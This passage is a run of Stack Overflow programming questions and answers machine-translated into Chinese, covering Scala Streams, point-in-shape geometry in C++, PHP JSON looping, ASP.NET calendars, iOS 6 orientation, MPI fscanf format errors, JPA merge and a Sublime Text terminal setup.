只要变量是类的字段而不是局部变量，Scalac 和 REPL 就可以使用该代码（使用 val）。您可以使变量变得惰性以满足 Scala Kata 的要求，但您通常不希望在实际程序中以这种方式使用 def（即，就其本身而言 def 是一个 Stream）。如果这样做，则每次调用该方法时都会创建一个新的 Stream，因此以前的计算结果（保存在 Stream 中）永远不会被重用。如果你使用来自这样一个 Stream 的许多值，性能将会很糟糕，最终你会耗尽内存。

该程序演示了以这种方式使用 def 的问题：

```
// Show the difference between the use of val and def with Streams.

object StreamTest extends App {

  def sum( p:(Int,Int) ) = { println( "sum " + p ); p._1 + p._2 }

  val fibs1: Stream[Int] = 0 #:: 1 #:: ( fibs1 zip fibs1.tail map sum )
  def fibs2: Stream[Int] = 0 #:: 1 #:: ( fibs2 zip fibs2.tail map sum )

  println("========== VAL ============")
  println( "----- Take 4:" ); fibs1 take 4 foreach println
  println( "----- Take 5:" ); fibs1 take 5 foreach println

  println("========== DEF ============")
  println( "----- Take 4:" ); fibs2 take 4 foreach println
  println( "----- Take 5:" ); fibs2 take 5 foreach println
} 
```

这是输出：

```
========== VAL ============
----- Take 4:
0
1
sum (0,1)
1
sum (1,1)
2
----- Take 5:
0
1
1
2
sum (1,2)
3
========== DEF ============
----- Take 4:
0
1
sum (0,1)
1
sum (0,1)
sum (1,1)
2
----- Take 5:
0
1
sum (0,1)
1
sum (0,1)
sum (1,1)
2
sum (0,1)
sum (0,1)
sum (1,1)
sum (1,2)
3 
```

请注意，当我们使用 val 时：

*   “take 5”没有重新计算“take 4”计算的值。
*   计算“take 4”中的第 4 个值不会导致重新计算第 3 个值。

但是当我们使用 def 时，这些都不是真的。Stream 的每次使用，包括它自己的递归，都从一个新的 Stream 开始。由于产生第 N 个值需要我们首先产生 N-1 和 N-2 的值，每个值都必须产生自己的两个前任，依此类推，产生一个值所需的 sum() 调用次数的增长很像斐波那契数列本身：0, 0, 1, 2, 4, 7, 12, 20, 33, .... 由于所有这些 Streams 同时在堆上，我们很快就会耗尽内存。

因此，鉴于性能不佳和内存问题，您通常不想在创建 Stream 时使用 def。

但这可能是您实际上每次*都想要一个新的 Stream 。*假设您需要一个随机整数流，并且每次访问该流时都需要新的整数，而不是以前计算的整数的重放。并且那些先前计算的值，因为您不想重用它们，会不必要地占用堆上的空间。在这种情况下，使用 def 是有意义的，这样您每次都会获得一个新的 Stream 而不要坚持它，这样它就可以被垃圾收集：

```
scala> val randInts = Stream.continually( util.Random.nextInt(100) )
randInts: scala.collection.immutable.Stream[Int] = Stream(1, ?)

scala> ( randInts take 1000 ).sum
res92: Int = 51535

scala> ( randInts take 1000 ).sum
res93: Int = 51535                   <== same answer as before, from saved values

scala> def randInts = Stream.continually( util.Random.nextInt(100) )
randInts: scala.collection.immutable.Stream[Int]

scala> ( randInts take 1000 ).sum
res94: Int = 49714

scala> ( randInts take 1000 ).sum
res95: Int = 48442                   <== different Stream, so new answer 
```

把randInts做成一个方法会导致我们每次都得到一个新的Stream，所以我们得到了新的值，这个Stream就可以被收集了。

请注意，这里只使用 def 才有意义，因为新值不依赖于旧值，因此 randInts 不是根据自身定义的。 `Stream.continually`是一种生成此类 Streams 的简单方法：您只需告诉它如何生成值，它就会为您生成 Stream。

# c++ - 确定一组点是在正方形内部还是外部

> ID：13217224
> 
> 赞同：0
> 
> 时间：2012-11-04T08:44:14.567
> 
> 标签：c++

我有两个：

```
bool isPointOnShape(int a, int b)
{

}

bool isPointInShape(int a, int b)
{

} 
```

假设我有一个正方形，第一个点（左下角）是 x,y (0,0) 第二个点（左上角）是 (0,2)，第三个是 (2,2)，第四个是 (0,2) .

形状上的点是 (0,1) (1,2) (2,1) (1,0)，形状上的点是 (1,1)

我如何找出形状/形状上的点并返回一个真实值，以便我可以将它存储在某个地方？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-04T09:40:22.170

我将为任何可以分成直线段的形状提供通用解决方案。

因此，正如您可能已经猜到的那样，我首先将您的“形状”视为完成循环的段列表。或者简单地放置一个表示循环的点的圆形列表，例如，您的正方形将是这个点列表：

```
0, 0
0, 2
2, 2
2, 0 
```

请注意，我们认为从每个点到下一个点都有段，并且最后一个点连接到第一个点。此外，我们要求没有连续的点是相等的，也不是第一个和最后一个。如果有，则必须在继续之前将其删除。

* * *

现在，对于每个段，我们可以确定边界框。例如给定这个段：

```
a = (0, 2)
b = (2, 2) 
```

那么 x 中的值范围是 [0, 2] ，而 y 中的值范围是 [2, 2] ，这就是该段的边界框。

接下来你需要的是线段的导向向量。为此，首先计算段的长度：

```
length = sqrt((a.x - b.x)*(a.x - b.x) + (a.y - b.y)*(a.y - b.y)) 
```

进而：

```
director.x = (a.x - b.x)/length
director.y = (a.y - b.y)/length 
```

注意 1：当长度为 0 时，您的段无效。这就是为什么我们不想要重复的点。

注2：使用导向向量而不是使用直线方程会使事情变得更容易。

* * *

现在，给定一个点 p，您可以确定该点是否在一个段中（如果它是列表中的一个点）。对于其余的情况，我们首先查看它是否在轴对齐的边界框内。这只需检查范围即可完成：

```
if
(
    (p.x >= box.left && p.x <= box.right) &&
    (p.y >= box.top && p.y <= box.bottom) // with origin at the top-left corner
)
{
     //It is inside of the bounding box
} 
```

如果是，那么我们计算从点到直线的距离，如果是 0，那么它就在直线上。现在，由于浮点运算，您可以测试距离是否小于或等于 epsilon，其中 epsilon 是一个非常小的数字。

我们使用这个公式：

```
distance vector = (a - p) - ((a - p) · director) * director
distance = the norm of distance vector 
```

其中“·”表示点积，“*”表示标量积。

剩下的就是迭代段，为每个段计算距离，如果任何人的距离小于 epsilon，那么该点就在“形状上”。

* * *

好的，但是“形状”呢？

好吧，借助拓扑学的技巧，我们可以确定一个点是否在内部。这与 Windows 用于填充多边形或折线的算法相同（例如，在 Microsoft Paint 中徒手决定选定区域内的内容）。

它是这样的：

> 计算从外部到达该点必须经过的路段数。如果数字是对的，那么它在外面，如果它是奇数，那么它在里面。

您可以选择从哪个方向到达该点。我选左边。

再一次，您将遍历这些段。对于每一个，我们需要确定它是否在垂直范围内。为此使用边界框：

```
if ((p.y >= box.top && p.y <= box.bottom))
{
     //In the vertical range
} 
```

现在，确定该段是在左侧还是右侧：

```
if (p.x < box.left)
{
     //The segment is at the left
}
else if (p.x > box.right)
{
     //The segment is at the right
}
else
{
     //The segment is close, need further calculation
} 
```

如果段很近，我们需要计算到该段的矢量距离并检查它的方向。

向量距离？好吧，我们已经有了它，我们正在用它的规范来确定距离。现在，不是采用范数，而是验证 x 坐标的符号。如果小于0，则为右，如果大于0，则为左。如果为 0... 则表示该段是水平的（因为距离向量始终垂直于该段），您可以跳过该段*。

*：实际上，如果段是水平的并且在垂直范围内，则表示它在该段上。段是否“成形”？

现在，您需要计算左侧的段数，如果是奇数，则该点位于形状内部。否则就不行了。这也可以通过向上、向右或向下的段来完成。我刚选了左边。

* * *

对于迭代所有段的成本很高的大型形状，您可以将段存储在一些空间分区数据结构中。这超出了本文的范围。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-04T08:52:43.203

如果我假设你有一个`Rectangle`类并且这个类有成员`bottomLeft`and `topRight`，你可以这样写：

```
bool Rectangle::isPointOnShape(int x, int y) {
    if (x == bottomLeft.x || x == topRight.x)
        if (y > bottomLeft.y && y < topRight.y)
            return true;

    if (y == bottomLeft.y || y == topRight.y)
        if (x > bottomLeft.x && x < topRight.x)
            return true;
}

bool Rectangle::isPointInShape(int x, int y) {
    bool inX = false;
    bool inY = false;
    if (x > bottomLeft.x && x < topRight.x)
        inX = true;

    if (y > bottomLeft.y && y < topRight.y)
        inY = true;

    return (inX && inY);
} 
```

如果您的形状不是矩形，则此功能当然会有所不同。

# php - 循环遍历深度 JSON 树

> ID：13217225
> 
> 赞同：0
> 
> 时间：2012-11-04T08:44:30.697
> 
> 标签：php, json

**JSON**

```
[
  {
    "kind": "Listing"
  },
  {
    "kind": "Listing",
    "data": {
      "children": [
        {
          "data": {
            "body": "body1"
          }
        },

        {
          "data": {
            "body": "body2"
          }
        }
      ]
    }
  }
] 
```

我要循环的部分：[{first set of values},{data->children->data->body}

最后一具尸体是我想要抓住的部分。还有其他多组，每个“正文”代表一个单独的评论，在 reddit 上没有孩子。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T09:01:12.297

[json_decode](http://php.net/manual/en/function.json-decode.php)将 json 解码成一个对象，然后循环：

```
<?php 
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "http://www.reddit.com/r/indie/comments/zc0lz/.json");
curl_setopt($curl, CURLOPT_HEADER, 0);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($curl, CURLOPT_TIMEOUT, 30);
$json = curl_exec($curl);
curl_close($curl);
//decode the json
$json_obj = json_decode($json);
//loop the result set(array) and access the data->children sub array.
foreach($json_obj as $v){
    foreach($v->data->children as $d){
        if(isset($d->data->body)){
            echo $d->data->body.'<br />'.PHP_EOL;
        }
    }
}

/*
Is anyone else bored with this? The first album was good for the moment it existed in, but the has since passed. It just seems their sound didn't mature very well.<br />
Yeah, from the songs I had heard, this album missed it. Too similar and not as exciting.<br />
half the album is just as amazing as the first. half is kind of dull<br />
Got this album today, maybe 2 decent-ish songs, but it sounds like they have tried to copy some of the sounds from the album way too closely. Real shame. 4/10<br />
If the player doesn't work, refresh the page and try again. You can also use the NPR link!<br />
Loved the sound of the first album, and I'm kind of happy they've not strayed to much away from this. Have to agree that it seems to be missing the 'awesomeness' that made the first songs so enjoyable to listen to.<br />
*/
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T11:01:06.890

要将有效的 Json 字符串解码为 PHP 对象和数组形式的 PHP 变量，您可以使用该[`json_decode`](http://php.net/json_decode)函数。

要遍历 PHP 变量中的值（尤其是数组和对象），您可以使用[`foreach`](http://php.net/foreach).

如果您在查找要在深度树中循环的值时遇到问题，请参阅

*   [能够在 print_r() 的输出中看到一个变量，但不确定如何在代码中访问它](https://stackoverflow.com/a/6322173/367456)

But you have not told what your *actual* issue with the Json string is, so I can only answer in this general form.

# javascript - 使用 Calendar Extender 和 Javascript ASP.NET 验证日期

> ID：13217226
> 
> 赞同：4
> 
> 时间：2012-11-04T08:44:36.020
> 
> 标签：javascript, asp.net, validation, date, calendarextender

如何使用 Javascript在日历扩展器中禁用**周六和周日。**

现在，我正在使用后面的代码来禁用上一个日期，就像在这个页面加载中一样。

```
public partial class TESTING : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        txtDelivery_CalendarExtender.StartDate = DateTime.Now;
    }
} 
```

ASP.NET 控件

```
<asp:TextBox ID="txtDelivery" runat="server"></asp:TextBox>

<asp:CalendarExtender ID="txtDelivery_CalendarExtender" runat="server" 
    PopupButtonID="ImageButton1" TargetControlID="txtDelivery" >
</asp:CalendarExtender>

<asp:ImageButton ID="ImageButton1"
    runat="server" ImageUrl="~/Images/Calendar.png" />

<asp:ScriptManager ID="ScriptManager1" runat="server">
</asp:ScriptManager> 
```

另外，我想禁用从今天开始的特定天数。

例如，如果今天是 2012 年 11 月 4 日，我想有 10 个工作日，那么 11 月 4 日到 14 日之间的日期应该被禁用。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T21:03:39.983

要禁用周末，请修改您的控件标记，如下所示

```
<asp:CalendarExtender ID="txtDelivery_CalendarExtender" runat="server" 
    PopupButtonID="ImageButton1" TargetControlID="txtDelivery" OnClientShown="DisableWeekend" >
</asp:CalendarExtender> 
```

并使用以下 javascript

```
function DisableWeekend(sender, args) {
        $(".ajax__calendar_day[title*='Saturday'],.ajax__calendar_day[title*='Sunday']").each(function () {
            $(this).parent().addClass('ajax__calendar_invalid');
        });
} 
```

如果您需要通过 javascript 对日历控件的功能进行精细控制，我建议您仔细查看 CalendarBehavior.js 文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T07:56:06.430

你可以试试这些：

Javascript

```
function DisableWeekends(sender, args)
{
     for(var i=0; i<sender._days.all.length; i++)
    {
              for(var j=0; j<6; j++)
             {
                    if(sender._days.all[i].id == “calendarValidToDate_day_”+j+”_0″)
                   {
                          sender._days.all[i].disabled = true;
                          sender._days.all[i].innerHTML = “&lt;div>” +sender._days.all[i].innerText+ “&lt;/div>”;
                    }

                    if(sender._days.all[i].id == “calendarValidToDate_day_”+j+”_6″)
                   {
                            sender._days.all[i].disabled = true;
                            sender._days.all[i].innerHTML = “&lt;div>” +sender._days.all[i].innerText+ “&lt;/div>”;
                   }
            }
     }
} 
```

.aspx

```
<asp:TextBox ID=”txtDate” Enabled=”true” runat=”server” Width=”200px” />
<asp:ImageButton runat=”server” ID=”imageValidToDate” SkinID =”calendarButton” />
<asp:CalendarExtender ID =”calendarValidToDate” runat=”server”
    TargetControlID=”txtDate” Format=”dd/MM/yyyy” PopupButtonID =”imageValidToDate”
    FirstDayOfWeek=”Default” OnClientShown=”DisableWeekends”&gt;
</asp:CalendarExtender> 
```

# javascript - 使用 javascript 和 HTML 的动态树结构

> ID：13217227
> 
> 赞同：0
> 
> 时间：2012-11-04T08:44:54.003
> 
> 标签：javascript, html

我想制作像上传到这里的图片一样的家谱。谁能告诉我如何设置 div 的左侧和顶部，它不会在 div 上重叠？我希望 javascript 设置 left 和 top 这样，它不会相互重叠并完美显示。

请帮我。

提前致谢。

![在此处输入图像描述](../Images/254933f160b1167fcb9b17f40610c83e.png)

实际上，我想动态地制作这种结构。

![在此处输入图像描述](../Images/2ab53dc0c07c5fbbbc0fd4d1ed90686a.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T08:56:13.207

您可以使用[**jQuery Org Chart**](https://th3silverlining.com/2011/12/01/jquery-org-chart-a-plugin-for-visualising-data-in-a-tree-like-structure/)，这是一个以树状结构可视化数据的插件。

[![](../Images/35d2a03ff1476808d7f7090f16925d92.png)](https://i.stack.imgur.com/JcITF.png)
[（来源：[akamai.net](https://a248.e.akamai.net/camo.github.com/4b9fddaac057cc533324300f2b7ae1b5b13d007f/687474703a2f2f692e696d6775722e636f6d2f54386b4b412e706e67)）]

您还可以更改选项以在左侧、右侧和顶部显示树！`:)`

# python - Python pysmb 获取文件夹的正确用法

> ID：13217228
> 
> 赞同：0
> 
> 时间：2012-11-04T08:45:00.587
> 
> 标签：python, python-3.x, python-2.7

我有一个远程（Windows）服务器，我想连接并处理一些文件夹。

我尝试使用 SMBHandler 失败：

```
director = urllib2.build_opener(SMBHandler)
fh = director.open('smb://myuserID:mypassword@192.168.1.1/Publish') 
```

它失败并出现以下错误：

```
URLError: <urlopen error smb error: Failed to retrieve on Publish: Unable to open file 
```

我编写了以下代码，使用 SMBConnection 可以完美运行，但我确信有更好的方法来获取文件夹并查询其子文件夹和文件......

```
conn = SMBConnection(USERID, PASSWORD, SERVER_NAME, SERVER_NAME, use_ntlm_v2 = True)
conn.connect(SERVER_IP, 139)
filelist = conn.listPath('Publish', '/')
if filelist[5].isDirectory:
    print filelist[5].filename
etc... 
```

你能帮我找到解决我问题的最优雅的方法吗？

非常感谢你 ：）

尼力

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T13:04:44.090

pysmb 的 SMBHandler 不允许您通过 urllib 列出文件夹中的文件。

到目前为止，您使用 SMBConnection 所做的是推荐的方法来列出文件夹中的文件。

# android - 布局中的解析样式错误

> ID：13217230
> 
> 赞同：2
> 
> 时间：2012-11-04T08:45:21.130
> 
> 标签：android, xml, eclipse, parsing

我正在尝试为 android 布局中的图像按钮设置样式，但它在 Eclipse 中给了我这个错误：

```
app_download_detail.xml: Failed to parse file N:\My Projects\app\res\drawable\title_home.xml

org.xmlpull.v1.XmlPullParserException: Binary XML file line #3: <item> tag requires a 'drawable' attribute or child tag defining a drawable
    at android.graphics.drawable.StateListDrawable.inflate(StateListDrawable.java:167)
    at android.graphics.drawable.Drawable.createFromXmlInner(Drawable.java:787)
    at android.graphics.drawable.Drawable.createFromXml(Drawable.java:728)
    at ..... 
```

-----> 这个问题通过将我的 Adt 更新到新版本来解决......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T08:55:10.643

根据错误，您尚未在`StateListDrawable.java`文件的第 167 行为您正在膨胀的布局项目设置“可绘制”属性。

浏览 xml 文件并设置缺少的可绘制属性，你应该没问题。

# qt - 在 QAxWidget 中查看 word 文档时缺少滚动条

> ID：13217231
> 
> 赞同：1
> 
> 时间：2012-11-04T08:45:22.973
> 
> 标签：qt, ms-word, activex

我想在 QT 应用程序中查看 word 文档。我拥有的 QT 版本是 4.7.2，使用 Visual Studio 2010 Service Pack 2 编译。我安装了 MS Word 2003。我有以下代码：

```
QAxWidget* WordDocument=new QAxWidget ("Word.Document",this);
WordDocument-> setGeometry (QRect (10, 10, 621, 471));
WordDocument->setControl ("c:\\tset.doc");
WordDocument-> show (); 
```

我可以看到 word 文档，但是缺少滚动条。有什么想法有什么问题吗？

# iphone - 带有 iOS 6 的 XCode 4.5.2 GM Seed 版本中的方向问题

> ID：13217234
> 
> 赞同：2
> 
> 时间：2012-11-04T08:46:15.073
> 
> 标签：iphone, ios, ios6, xcode4.5

我正在开发同时支持纵向方向（纵向和纵向颠倒）的 iPhone 应用程序。

在早期的 XCode4.5.1 中，我通过以下方式解决了这个问题：

*   在 AppDelegate 中设置 rootViewController
*   像这样提到 shouldAutorotateToInterfaceOrientation ：

    ```
    -(BOOL)shouldAutorotateToInterfaceOrientation:    (UIInterfaceOrientation)toInterfaceOrientation {

         return UIInterfaceOrientationIsPortrait(toInterfaceOrientation);   } 
    ```

*   在 info.plist 文件中提及supportedInterfaceOrientation

现在我正在为较新的 XCode 做同样的事情，但在 iPhone 模拟器 v6.0 中它不支持正确旋转。

我也尝试过这些方法：

```
-(BOOL) shouldAutorotate {

  BOOL returnValue = NO;

  int interface =  [self preferredInterfaceOrientationForPresentation];

  if(UIInterfaceOrientationIsPortrait(interface)) {

    // Code to handle portrait orientation
    returnValue = YES;
  }
  else {

    // Code to handle Landscape orientation
    returnValue = NO;
  }

  return returnValue;
}

- (NSUInteger) supportedInterfaceOrientations {

  return (UIInterfaceOrientationPortrait | UIInterfaceOrientationPortraitUpsideDown);
}

- (UIInterfaceOrientation)preferredInterfaceOrientationForPresentation
{
  return (UIInterfaceOrientationPortrait |
          UIInterfaceOrientationPortraitUpsideDown);
} 
```

请指导我如何支持 iOS > 4.3 所有版本的纵向方向。

提前致谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-05T18:58:58.507

***为什么在 iOS 6 中方向更改为横向停止工作？***

从 IOS 6.0 开始，有几个方向更改阻止了我的应用程序从纵向旋转。对我来说，以及适用于此处的解决方法是，您必须`setRootViewController`在 AppDelegate 的窗口上。较早的答案提供了几个正确的建议，但错过了与我相关的一项。

在`application didFinishLaunchingWithOptions`，之后：

```
[window makeKeyAndvisible] 
```

或者

```
[window addSubview: viewController.view]; 
```

您必须替换为：

```
if([[UIDevice currentDevice].systemVersion floatValue] >= 6.0) {
    [window setRootViewController:viewController];
} else {
    [window addSubview: viewController.view];
    (or [window makeKeyAndvisible])
} 
```

您还需要添加 new`shouldAutoRotate`而不是 depreciated `shouldAutorotateToInterfaceOrientation`，但这对我来说更容易找到并且不太重要。

与确保在 .plist 文件中指定所有方向相同。

我不需要覆盖`supportedInterfaceOrientations`，因为我对默认方向感到满意（全部用于 iPad `UIInterfaceOrientationMaskAll`，除了倒置用于 iPhone `UIInterfaceOrientationMaskAllButUpsideDown`）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T09:22:51.083

我不得不承认，当 iOS 6 出现时，我一直在摆弄这个，直到我有东西可以工作，然后才停下来。但是，这是我的猜测：

我相信它`shouldAutorotate`的目的是在您可能想要**动态**更改您的应用程序是否支持自动旋转的情况下使用。我不认为您打算告诉 iOS您支持**哪些**方向（如原始`shouldAutorotateToInterfaceOrientation:`方法）。因此，如果您的应用程序支持**任何**自动旋转，我认为您应该这样做：

```
-(BOOL) shouldAutorotate {
   return YES;
} 
```

`supportedInterfaceOrientations`是您应该确定您支持**哪些**方向的地方。

但是，在这种方法中，您所做的与我一直在使用的不同（这可能是问题，也可能不是问题）。我认为您应该为此方法[使用*掩码*常量。](http://developer.apple.com/library/ios/#documentation/UIKit/Reference/UIApplication_Class/Reference/Reference.html%23//apple_ref/doc/uid/TP40006728-CH3-DontLinkElementID_62)所以，而不是这个：

```
- (NSUInteger) supportedInterfaceOrientations {

   return (UIInterfaceOrientationPortrait | UIInterfaceOrientationPortraitUpsideDown);
} 
```

用这个：

```
- (NSUInteger) supportedInterfaceOrientations {

   return (UIInterfaceOrientationMaskPortrait | UIInterfaceOrientationMaskPortraitUpsideDown);
} 
```

另外，我认为该`preferredInterfaceOrientationForPresentation`方法不应返回多个方向。 *首选*可能应该只是一个，例如：

```
- (UIInterfaceOrientation)preferredInterfaceOrientationForPresentation
{
  return UIInterfaceOrientationPortrait;
} 
```

[这是相关的Apple文档](http://developer.apple.com/library/ios/#featuredarticles/ViewControllerPGforiPhoneOS/RespondingtoDeviceOrientationChanges/RespondingtoDeviceOrientationChanges.html)

**更新：**

您可能会尝试的另一件事是使用此方法：

```
- (NSUInteger)application:(UIApplication *)application supportedInterfaceOrientationsForWindow:(UIWindow *)window {
    return (UIInterfaceOrientationMaskPortrait | UIInterfaceOrientationMaskPortraitUpsideDown);
} 
```

在您的 App Delegate 类中。此方法是可选的，但可以为您的应用程序支持的方向设置默认值，以防您未在所有视图控制器或应用程序`plist`文件中指定它们。由于您没有显示您的`plist`文件和其他视图控制器，我无法判断这是否有帮助。但是，这可能是值得尝试的。

# c# - 获取包含 javascript 的网页的响应

> ID：13217239
> 
> 赞同：0
> 
> 时间：2012-11-04T08:46:57.463
> 
> 标签：c#, javascript

在我的 C# 应用程序中，我得到以下代码：

```
private void button1_Click(object sender, EventArgs e)
{
    string uri = urlTextBox.Text;

    Uri myURL;

    if (!Uri.TryCreate(uri, UriKind.Absolute, out myURL))
        return;

    WebRequest request = WebRequest.Create(myURL);
    request.Method = "GET";
    using (WebResponse response = request.GetResponse())
    {
        using (Stream stream = response.GetResponseStream())
        {
            using(StreamReader sr = new StreamReader(stream))
            {
                responseTextBox.Text = sr.ReadToEnd();
            }
        }
    } 
```

}

但是当我单击按钮时，它会返回以下文本：

```
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title>Login Timed Out</title>
<link rel=stylesheet type="text/css" href="../../shared/css/ilearn_base.css">
<script>
function redirectToTop(reloginLoc) {
   if (opener != null && opener != self) {
      opener.top.location = reloginLoc;
      window.close();
   }

   else if (top != self) {
      top.location = reloginLoc;
   }

   else {
      location = reloginLoc;
   }
}
</script>
<noscript>
Your browser does not support JavaScript. Please turn on JavaScript to use the features of this web page.
</noscript>

</head>
<body onLoad="redirectToTop('../../learner/jsp/relogin_site.jsp')">

</body>
</html> 
```

我不明白为什么它说：“ `Your browser does not support JavaScript. Please turn on JavaScript to use the features of this web page.`”，因为我在我当前的浏览器和 IE 中都激活了 JavaScript。

在我的 Internet 浏览器中，页面看起来不同，执行了脚本，我想了解如何在 C# 浏览器中激活 javascript 以获得完整响应。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T09:15:42.420

你得到了完整的回应。

如果您的浏览器不支持 javascript，则包含 noscript 标记。对于这个页面，服务器可能总是在响应中包含这个 - 这并不一定意味着您的浏览器不支持 javascript。

# php - Jquery UI日历显示mysql日期？

> ID：13217240
> 
> 赞同：1
> 
> 时间：2012-11-04T08:47:42.907
> 
> 标签：php, jquery, mysql, calendar

我需要使用 php 从 mysql 数据库中获取一系列日期，一旦我查询数据库并将所有日期作为查询的结果，那么是否可以在 jquery UI 日历上以红色显示这些日期？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T08:52:00.877

这是一些可以帮助您的代码。这是一个工作版本的链接：http: [//jsfiddle.net/tiborkiray/EXGW4/](http://jsfiddle.net/tiborkiray/EXGW4/)

CSS：

```
td.colorRed a {
    color: #FF0000;
} 
```

JavaScript：

```
$('#datepicker').datepicker({
        beforeShowDay: function(date) {
         // apply your logic in here
         if (date == yourDate) {
              return [true, 'colorRed', 'ToolTip'];
          }
          return [true, '', 'ToolTip'];
       }
}); 
```

函数 beforeShowDay 将日期作为参数，并且必须返回一个数组，其中 [0] 等于 true/false 指示此日期是否可选，[1] 等于 CSS 类名称或默认为 ""演示文稿，以及 [2] 此日期的可选弹出工具提示。在显示之前，它会在日期选择器中的每一天被调用。

您应该在客户端提供来自服务器端（MySql）的日期。一旦有了这些日期，就将它们添加到 beforeShowDay 逻辑中。在javascript中新建日期（unix_timestamp*1000）；会将您的服务器端时间戳转换为 javascript 可以使用的时间戳（1000 是从秒到毫秒）

# file - MPI fscanf() 返回假值

> ID：13217241
> 
> 赞同：2
> 
> 时间：2012-11-04T08:48:27.637
> 
> 标签：file, mpi, scanf

我的名为“a.txt”的文件包含一个数字 ( `47`)。

如果我在没有使用 MPI 的编译器上运行程序，`fscanf(a,"%f",&num)`它会给出一个真值 nnum = **47**。

如果我使用 MPI ssh 运行程序，它不会返回正确的值。它将返回 num = **1104187136**。

为什么是这样？

```
int main(int argc, char *argv[]){
  int count;
  FILE *a1;
  float a;
  int num;

  a1 = fopen("a1.txt","r");

  MPI_Init(&argc, &argv);
  MPI_Comm_size(MPI_COMM_WORLD,&numOfProc);
  MPI_Comm_rank(MPI_COMM_WORLD,&my_rank);

  if(my_rank == 0){     
    fscanf(a1,"%f",&num);
    a = num;
    printf("a = %d",a);
  }

  MPI_Finalize();
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T16:43:44.860

我认为这里的问题不是 MPI，甚至不是`fscanf`；问题是使用 fscanf。如果您在打开警告的情况下进行编译，您将收到几个有关格式代码的警告。

首先，您有：

```
int num;
fscanf(a1,"%f",&num); 
```

它试图将数字作为浮点数读入，然后给它一个指向 int 的指针来存储它。printf/scanf 格式的代码有点搞笑；它们不仅向 fscanf 指示如何解析输入，还向 fscanf 指示以何种表示形式保存结果。如果您尝试将 47.0 的浮点表示复制到 int 变量中，您将得到：

```
int num;
float a;

a = 47.0;
*(float *)&num = a;

printf("num = %d\n", num);
...

num = 1111228416 
```

printf 也会出现同样的问题：

```
a = num;
printf("a = %d",a); 
```

在这里，您将 num 中的值分配给 a，这很好，编译器将在那里插入类型转换，但随后您将该值解释为 int 并将其打印出来，因此您会在那里得到另一个表示/值不匹配。

*所以我认为在你的代码中*你想要：

```
fscanf(a1,"%f",&a);
printf("a = %f",a); 
```

*或者*

```
fscanf(a1,"%d",&num);
printf("num = %d",num); 
```

但不是您拥有它们的转换方式。

# jpa - JPA 添加或更新对象

> ID：13217242
> 
> 赞同：1
> 
> 时间：2012-11-04T08:48:32.457
> 
> 标签：jpa, eclipselink

我正在尝试使用 EclipseLink 保存一个名为 Stat 的对象。如果 id 存在于数据库中，则更新该对象。如果没有，请创建一个新对象。这是我的对象：

```
@Entity
public class Stat {

    @Column
    @Id
    @GeneratedValue(strategy = GenerationType.AUTO)
    public long id;

    @JoinColumn
    @ManyToOne
    public User user;

    @Column
    public boolean accepted;

    @Column
    public boolean finished;

    public Stat() {
    }
} 
```

这是我添加/更新对象的方法。

```
public long addReplaceStat(Stat stat) {
            em.getTransaction().begin();
            Stat oldStat = em.find(Stat.class, stat.id);
            if (oldStat == null)
                em.persist(stat);
            else
                em.merge(stat);
            em.getTransaction().commit();

            em.getTransaction().begin();
            Stat newStat = em.find(Stat.class, stat.id);
            if (newStat != null)
                em.refresh(newStat);
            em.getTransaction().commit();

            return stat.id;
        } 
```

我的问题是我在 em.refresh() 处遇到异常，说“类 [User] 的属性 [id] 已映射到数据库中的主键列。不允许更新。” 我不明白为什么。不应该刷新只是更新我的托管对象的值而没有问题吗？

做我想做的事（添加或更新）的最佳习语是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T12:38:38.810

JPA 规范说：

> 应用于实体 X 的合并操作的语义如下：
> 
> *   如果 X 是分离实体，则 X 的状态被复制到具有相同身份的预先存在的受管实体实例 X' 上，或者创建 X 的新受管副本 X'。
> *   如果 X 是一个新的实体实例，则创建一个新的托管实体实例 X'，并将 X 的状态复制到新的托管实体实例 X'。
> 
> [...]

因此，要添加如果不存在或更新是否存在，您只需要执行以下操作：

```
Stat attachedStat = em.merge(stat); 
```

关于您的刷新问题，我不知道为什么会发生。但是为什么要刷新刚刚从数据库中加载的实体呢？没有什么可刷新的。

# bash - Sublime Text 2 和终端

> ID：13217243
> 
> 赞同：3
> 
> 时间：2012-11-04T08:48:34.350
> 
> 标签：bash, terminal, sublimetext2

所以我正在努力做到这一点，以便我可以通过 Sublime Text 文档给出的这个命令从终端启动 Sublime Text 2：

```
ln -s "/Applications/Sublime Text 2.app/Contents/SharedSupport/bin/subl" ~/bin/subl 
```

但由于某种原因，这不起作用。我从终端收到此错误：

```
ln: /Users/connorblack/bin/subl: No such file or directory 
```

谁能帮我这个？

其他细节：我的应用程序文件夹中有 SB2。我正在尝试进行 RoR 开发。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-04T08:52:33.917

您的问题是您没有 ~/bin 目录，只需执行

```
mkdir ~/bin 
```

然后重试该命令，它应该可以工作

请注意，要使用此文件夹中的 subl，您仍需要将其`PATH`添加到您的 .bashrc 或 .zshrc 中：

```
export PATH=$PATH:/Users/connorblack/bin 
```

# java - Java语法上奇怪的ActionListener

> ID：13217246
> 
> 赞同：4
> 
> 时间：2012-11-04T08:49:04.377
> 
> 标签：java

我是 Java 新手。我试图查找这个语法，但找不到它。你能指出这是什么吗？

```
class actions{
   ...
